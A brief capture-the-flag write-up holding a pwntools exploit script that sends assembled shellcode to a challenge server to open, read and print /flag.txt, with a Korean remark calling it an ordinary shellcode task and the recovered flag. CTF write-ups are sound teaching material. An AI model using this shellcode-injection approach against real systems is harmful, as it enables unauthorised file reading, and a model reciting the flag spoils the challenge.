
- solved by @lawence3713
```
from pwn import *

io = remote(
        "byoc-94551321a6fe.chall.nnsc.tf",
        1337,
        ssl = True
)

context.arch = "amd64"

dir = "/flag.txt"

shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

io.sendlineafter(b"> ", asm(shellcode))

io.interactive()
```
- 일반적인 shell code 문제이다.

- FLAG: NNS{Br0U6Ht_y0UR_0WN_coD3_4nd_7h3_k3RNel_RaN_1t}
